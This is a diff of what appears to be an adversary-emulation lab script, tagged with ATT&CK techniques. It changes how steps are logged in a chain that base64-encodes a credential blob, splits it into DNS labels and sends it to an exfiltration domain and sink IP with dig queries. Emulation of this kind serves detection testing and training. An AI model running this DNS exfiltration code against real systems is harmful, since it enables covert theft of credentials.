@@ -66,8 +66,7 @@ fi
 
 # --- Step 3: Collection / staging -----------------------------------------
 step "Step 3: Collection — base64-encode the blob (ATT&CK T1560.001)"
-act T1560.001 "base64 -w0 | tr (encode credential blob)" "$LAB_NODE" "$RAW"
-B64="$(base64 -w0 "$RAW" | tr '+/' '-_' | tr -d '=')"   # url-safe, DNS-label friendly
+B64="$(ax T1560.001 "$LAB_NODE" "$RAW" -- base64 -w0 "$RAW" | tr '+/' '-_' | tr -d '=')"   # url-safe, DNS-label friendly
 say "encoded payload length: ${#B64} chars"
 
 # --- Step 4: Exfiltration over DNS ----------------------------------------
@@ -82,8 +81,7 @@ seq=0
 for ((i=0; i<${#B64}; i+=CHUNK)); do
     label="${B64:i:CHUNK}"
     qname="${seq}.${SESSION}.${label}.${EXFIL_DOMAIN}"
-    act T1048.003 "dig +short @${DNS_SINK} A" "$DNS_SINK" "$qname"
-    dig +short +tries=1 +time=2 @"$SINK_IP" "$qname" A >/dev/null 2>&1 \
+    ax T1048.003 "$DNS_SINK" "$qname" -- dig +short +tries=1 +time=2 @"$SINK_IP" "$qname" A >/dev/null 2>&1 \
         && say "  exfil seq=$seq ($label)" \
         || say "  exfil seq=$seq FAILED ($qname)"
     seq=$((seq+1))
